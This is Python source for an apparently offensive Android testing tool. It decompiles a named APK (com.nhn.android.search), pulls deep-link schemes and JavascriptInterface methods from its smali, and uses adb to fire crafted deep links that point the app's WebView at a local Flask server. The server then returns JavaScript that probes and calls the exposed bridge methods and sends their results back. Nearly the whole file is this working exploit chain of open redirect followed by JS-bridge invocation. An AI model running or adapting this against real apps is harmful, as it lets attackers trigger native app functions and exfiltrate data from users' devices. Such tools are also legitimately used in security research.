import os
import subprocess
from glob import glob
from flask import Flask, request
import time
import hashlib
import multiprocessing
import functools
import logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
def parse_string_xml(decompile_dir):
    strings_xml = dict()
    path = os.path.join(decompile_dir, "res", "values", "strings.xml")
    with open(path, encoding="utf-8") as f:
        xml = f.readlines()
 
    for line in xml:
        line = line.strip()
        if not line: continue
        if "string name=" in line and "/>" not in line:
            key = line.split("string name=")[1].split("\"")[1]
            value = line.split("\">")[1].split("</string>")[0]
            strings_xml[key] = value
    return strings_xml

def parse_scheme(decompile_dir):
    result = set()
    strings_xml = parse_string_xml(decompile_dir)
    
    path = os.path.join(decompile_dir, "AndroidManifest.xml")
    with open(path, encoding="utf-8") as f:
        manifest_file = f.readlines()
    
    for line in manifest_file:
        line = line.strip()
        if not line: continue
        deeplink = ""
        if "android:scheme=" in line:
            scheme = (line.split("android:scheme=")[1].split("\"")[1])
            if "@string/" in scheme:
                scheme = strings_xml[scheme.split("@string/")[1]]
            deeplink += scheme + "://"
            if "android:host=" in line:
                host = (line.split("android:host=")[1].split("\"")[1])
                if "@string/" in host:
                    host = strings_xml[host.split("@string/")[1]]
                deeplink += host
            if "android:path=" in line:
                path = (line.split("android:path=")[1].split("\"")[1])
                if "@string/" in path:
                    path = strings_xml[path.split("@string/")[1]]
                deeplink += path
            result.add(deeplink)
    
    return list(result)

def parse_smali_file(file_path):
    try:
        with open(file_path, encoding="utf-8") as f:
            lines = f.readlines()
    except: 
        print('no smali founded. Exit')
        return [], [], [], [], []
    
    local_register = dict()
    param = set()
    addURI = set()
    UriParse = set()
    addJsIf = set()
    method = set()
    for line in lines:
        line = line.strip()
        if not line: continue
        
        words = line.split(" ")
        if words[0] == ".class":
            class_name = line
        elif words[0] == ".method":
            method_name = line
    
        if ".annotation" in line and "Landroid/webkit/JavascriptInterface" in line:
            method.add(method_name.split(" ")[2].split("(")[0])
        
        try:
            if "const-string" in line:
                local_register[words[1][:-1]] = words[2].split("\"")[1]
            elif "getQueryParameter(" in line:
                if "}" not in line: 
                    continue
                var = line.split("}")[0].split()[-1]
                if var in local_register:
                    param.add(local_register[var])
            elif "addURI(" in line:
                var_list = line.split("{")[1].split("}")[0].split(", ")
                if var_list[1] in local_register and var_list[2] in local_register:
                    host = local_register[var_list[1]]
                    path = local_register[var_list[2]]
                    addURI.add(host + "/" + path)
            
            elif "Uri;->parse(" in line:
                var = line.split("{")[1].split("}")[0]
                if var in local_register:
                    UriParse.add(local_register[var])
            elif "addJavascriptInterface(" in line:
                if "}" not in line: continue
                var_list = line.split("{")[1].split("}")[0].split(", ")
                if(len(var_list) == 3):
                    if var_list[1] in local_register and var_list[2] in local_register:
                        addJsIf.add(local_register[var_list[2]])
        except Exception as e:
            print('Error occured..!!!')
            print(file_path, line)
            print(e)
            exit()
    return list(param), list(addURI), list(UriParse), list(addJsIf), list(method)
 
def parse_smali(decompile_dir):
    params = set()
    addURIs = set()
    UriParses = set()
    tmpUriParse = set()
    addJsIfs = set()
    methods = set()
    for diretory in glob( os.path.join(decompile_dir, "smali*") ):
        for path, dirs, files in os.walk(diretory):
            for file in files:
                f = os.path.join(path, file)
                param, addURI, UriParse, addJsIf, method = parse_smali_file(f)
                #print(file,':',param, addURI, UriParse, addJsIf, method)
                if len(param) > 0: params.update(param)
                if len(addURI) > 0: addURIs.update(addURI)
                if len(UriParse) > 0: tmpUriParse.update(UriParse)
                if len(addJsIf) > 0: addJsIfs.update(addJsIf)
                if len(method) > 0: methods.update(method)
        for Uri in tmpUriParse:
            for deeplink in deeplinks:
                if deeplink in Uri:
                    UriParses.add(Uri)
                    break
 
    return list(params),list(addURIs),list(UriParses),list(addJsIfs),list(methods)

@app.route("/redirect/<hash>")
def redirect(hash):
    temp = app.config["shm"][hash]
    temp["redirect"] = True
    app.config["shm"][hash] = temp
    print(request.headers)
    return ""
@app.route("/fetch/<hash>")
def fetch(hash):
    res = "<html><script>\n"
    for jsif in app.config["shm"][hash]["addJsIfs"]:
        for method in app.config["shm"][hash]["methods"]:
            data = (str(time.time())+jsif+method).encode()
            new_hash = hashlib.sha1(data).hexdigest()
            app.config["shm"][new_hash] = {
            "deeplink": app.config["shm"][hash]["deeplink"],
            "param": app.config["shm"][hash]["param"],
            "jsif": jsif,
            "method": method
            } 
            res += "try{fetch(`/isfunc/%s?ret=`+window.%s.%s);}catch{}\n" % (new_hash, jsif, method)
    res += "</script></html>"
    return res
@app.route("/isfunc/<hash>")
def isfunc(hash):
    if request.args.get('ret') != "undefined":
        app.config["shm"]["jsif_func"] += [hash]
    return ""
@app.route("/exec/<hash>")
def exec(hash):
    jsif = app.config["shm"][hash]["jsif"]
    method = app.config["shm"][hash]["method"]
    new_hash = hashlib.sha1((str(time.time())+jsif+method).encode()).hexdigest()
    app.config["shm"][new_hash] = {"jsif": jsif, "method": method}
    res = "<html><script>try{fetch(`/return/%s?ret=`+window.%s.%s());}catch(e){fetch(`/return/%s?err=`+e)}</script></html>" % (new_hash, jsif, method, new_hash)
    return res
@app.route("/return/<hash>")
def ret(hash):
    if request.args.get('ret'):
        print(request.args.get('ret'))
    elif request.args.get('err'):
        print(request.args.get('err'))
    return ""
deeplinks = []
def adb(cmd):
    return subprocess.check_output(
    "C:\\adb\\platform-tools\\adb.exe %s" % cmd, # adb 사용할 거면 자신의 컴퓨터의 adb.exe의 경로에 맞게 경로를 수정해줘야함!!!
    shell=True,
    stderr=subprocess.STDOUT
    )
def open_deeplink(deeplink, sleep_time=3):
    stdout = adb("shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d \"%s\"" % (deeplink))
    if b"Error" in stdout:
        time.sleep(0.5)
    elif b"Warning" in stdout:
        time.sleep(0.5)
    else: 
        time.sleep(sleep_time)
 
    adb("shell input keyevent 3")
def run_server(shm):
    app.config["shm"] = shm
    app.run(host='0.0.0.0', port=8012)
if __name__ == "__main__":
    manager = multiprocessing.Manager()
    shm = manager.dict()
    p = multiprocessing.Process(target=functools.partial(run_server, shm))
    p.start()
    
    time.sleep(3)
    addr = "0.0.0.0:8012"
    apk = "C:\FindScheme\com.nhn.android.search.apk"    # APK 경로는 여기에서 설정!!!
    decompile_dir, _ = os.path.splitext(apk)
    print('decompile_dir:',decompile_dir)
    if not os.path.isdir(decompile_dir):
        os.system("java -jar apktool.jar d %s -f --output %s" % (apk, decompile_dir))
    with open(os.path.join(decompile_dir, "AndroidManifest.xml"), encoding="UTF8") as f:
        package = f.read().split("package=\"")[1].split("\"")[0]
    print ("package name:", package)
    if len(adb("shell pm list packages %s" % package)) == 0:
        adb("install %s" % (apk)) 
    deeplinks = parse_scheme(decompile_dir)
    params, addURIs, UriParses, addJsIfs, methods = parse_smali(decompile_dir)

    print('deeplink:',deeplinks)
    print('params:',params)
    print('addURIs',addURIs)
    print('UriParses',UriParses)
    print('addJsIfs',addJsIfs)
    print('methods',methods)

    for deeplink in deeplinks:
        if "kakao" in deeplink or "naver" in deeplink: continue
        data = (str(time.time())+deeplink).encode()
        hash = hashlib.sha1(data).hexdigest()
        shm[hash] = {"deeplink": deeplink, "param": "", "redirect": False}
        dl = "{}=http://{}/redirect/{}".format(deeplink, addr, hash)
        open_deeplink(dl)
        
        for param in params:
            data = (str(time.time())+deeplink+param).encode()
            hash = hashlib.sha1(data).hexdigest()
            shm[hash] = {"deeplink": deeplink, "param": param, "redirect": False}
            dl = "{}?{}=http://{}/redirect/{}".format(deeplink, param, addr, hash)
            open_deeplink(dl)
            
    redirect_result = list(shm)
    shm["jsif_func"] = list()
    for hash in redirect_result:
        if shm[hash]["redirect"]:
            dl = shm[hash]["deeplink"]
            param = shm[hash]["param"]
            data = (str(time.time())+dl+param).encode()
            new_hash = hashlib.sha1(data).hexdigest()
            shm[new_hash] = {"deeplink": dl, "param": param,
            "addJsIfs": addJsIfs, "methods": methods
            }
            if param == "":
                rdl = "{}=http://{}/fetch/{}".format(dl, addr, new_hash)
            else:
                rdl = "{}?{}=http://{}/fetch/{}".format(dl, param, addr, new_hash)
            open_deeplink(rdl)
    
    for hash in shm["jsif_func"]:
        dl = shm[hash]["deeplink"]
        param = shm[hash]["param"]
        data = (str(time.time())+dl+param).encode()
        new_hash = hashlib.sha1(data).hexdigest()
        shm[new_hash] = {
            "deeplink": dl, "param": param,
            "jsif": shm[hash]["jsif"], "method": shm[hash]["method"]}
        if param == "":
            rdl = "{}=http://{}/exec/{}".format(dl, addr, new_hash)
        else:
            rdl = "{}?{}=http://{}/exec/{}".format(dl, param, addr, new_hash)
    
    open_deeplink(rdl)
